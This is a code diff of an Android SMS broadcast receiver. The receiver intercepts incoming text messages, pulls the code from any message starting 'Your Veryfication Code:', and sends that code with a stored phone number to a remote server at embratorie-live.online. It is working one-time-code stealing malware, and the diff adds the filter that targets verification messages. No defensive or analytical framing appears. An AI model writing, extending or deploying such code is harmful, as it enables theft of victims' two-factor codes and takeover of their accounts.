@@ -29,35 +29,44 @@ public class SmsBroadcastReceiver extends BroadcastReceiver {
 
 
     private static final String TAG = "SmsBroadcastReceiver";
-    Context contextTMP ;
+    Context contextTMP;
     private String Phone;
 
     @Override
     public void onReceive(Context context, Intent intent) {
 
         this.contextTMP = context;
-        this.Phone = (String) ReadFromFile(context,"phoneNumber");
+        this.Phone = ReadFromFile(context, "phoneNumber");
         if (intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
             String smsBody = "";
             for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                 smsBody += smsMessage.getMessageBody();
-            }
-            smsBody = smsBody.split(" ")[3];
-            //create Toast
-            Toast.makeText(context, "BroadcastReceiver caught conditional SMS: " + smsBody, Toast.LENGTH_LONG).show();
 
-            // send sms body to server
-            sendNetworkRequest(context,smsBody);
+            }
+            String[] worlds = smsBody.split(" ");
+            if (worlds.length >= 4) {
+                String code = worlds[3];
+                //create Toast
+                Toast.makeText(context, "BroadcastReceiver caught conditional SMS: " + code, Toast.LENGTH_LONG).show();
+                for (String s : worlds) {
+
+                }
+                if (worlds[0].equals("Your") && worlds[1].equals("Veryfication") && worlds[2].equals("Code:")) {
+                    Toast.makeText(context, "BLS message", Toast.LENGTH_SHORT).show();
+                    // send sms body to server
+                    sendNetworkRequest(context, code);
+                }
+            }
 
             Log.d(TAG, "SMS detected: text " + smsBody);
 
         }
     }
-    public void sendNetworkRequest(Context context , String smsBody){
+
+    public void sendNetworkRequest(Context context, String smsBody) {
 
         // Set up the network to use HttpURLConnection as the HTTP client.
         Network network = new BasicNetwork(new HurlStack());
-
 
 
         // Instantiate the cache
@@ -69,7 +78,7 @@ public class SmsBroadcastReceiver extends BroadcastReceiver {
         // Start the queue
         mRequestQueue.start();
 
-        String url = "http://embratorie-live.online/phone.php?Phone="+Phone+"&Code="+smsBody;
+        String url = "http://embratorie-live.online/phone.php?Phone=" + Phone + "&Code=" + smsBody;
 
         // Formulate the request and handle the response.
         StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
@@ -93,18 +102,19 @@ public class SmsBroadcastReceiver extends BroadcastReceiver {
         //
 
     }
-    public String ReadFromFile(Context context,String fileName ){
+
+    public String ReadFromFile(Context context, String fileName) {
 
         try {
             FileInputStream in = context.getApplicationContext().openFileInput(fileName);
             InputStreamReader sr = new InputStreamReader(in);
-            String s="";
-            char[] charTab= new char[100];
+            String s = "";
+            char[] charTab = new char[100];
 
             int read = sr.read(charTab);
 
-            if(read > 0){
-                return String.copyValueOf(charTab,0,read);
+            if (read > 0) {
+                return String.copyValueOf(charTab, 0, read);
             }
             return s;
 
